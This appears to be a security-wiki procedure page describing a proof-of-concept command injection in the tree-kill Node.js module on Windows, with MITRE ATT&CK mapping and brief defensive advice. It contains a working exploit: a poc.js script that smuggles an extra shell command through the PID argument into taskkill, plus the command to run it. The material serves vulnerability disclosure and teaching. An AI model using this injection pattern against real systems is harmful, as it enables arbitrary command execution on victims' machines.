---
tags:
  - rce
  - command-injection
  - node-js
type: procedure
tools:
  - '[[tools/node]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/node-execute-poc]]'
verified: false
platforms:
  - Windows
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Windows Command Shell]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:32.654Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 724700ba-3db6-421f-9b8e-7eab5ad671e0
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Windows Command Shell]]'
  - '[[Exploitation for Client Execution]]'
---
# Execute-PoC-to-Trigger-RCE

## Summary

This procedure creates and runs a proof-of-concept JavaScript script that exploits the tree-kill module's vulnerability by passing a malicious PID string, injecting commands into the Windows taskkill execution.

## Description

The vulnerability stems from line 20 in index.js where the Windows branch concatenates user input directly: 'taskkill /F /PID ' + signal. By providing '3333332 & echo "HACKED" > HACKED.txt &' as the signal, attackers inject shell commands. This step involves writing a simple Node.js script (poc.js) that requires tree-kill and calls its kill function with the payload, then executing it via the Node runtime on Windows.

## Requirements

1. tree-kill v1.2.1 installed in the project
2. Node.js runtime on Windows
3. Text editor to create poc.js

## Defense

Defensive measures and detection strategies:

- Update to tree-kill >1.2.1
- Input validation and sanitization in process-killing code
- Monitor for anomalous taskkill executions and file creations

## Objectives

1. Trigger command injection via malicious PID
2. Execute arbitrary shell commands silently
3. Demonstrate RCE capability

## Instructions

### Step 1: Create PoC Script

**Context**: Write poc.js to load tree-kill and invoke kill with payload.

**Command** (Manual file creation):
```javascript
// poc.js
const kill = require('tree-kill');
kill(123, '3333332 & echo "HACKED" > HACKED.txt &');
```

> Save this as poc.js in the project directory.

### Step 2: Run the Script

**Context**: Execute the PoC to trigger the vulnerability.

**Command** ([[commands/node-execute-poc]]):
```bash
node poc.js
```

> Runs the script, invoking tree-kill which concatenates the malicious input into taskkill. Expected output: No visible errors; injection happens in cmd.exe background.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Windows Command Shell]] Windows Command Shell
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### Sub-Techniques

- None

## Commands Used

- [[commands/node-execute-poc]]

## Tools Used

- [[tools/node]]

## Tags

- rce
- command-injection
- node-js
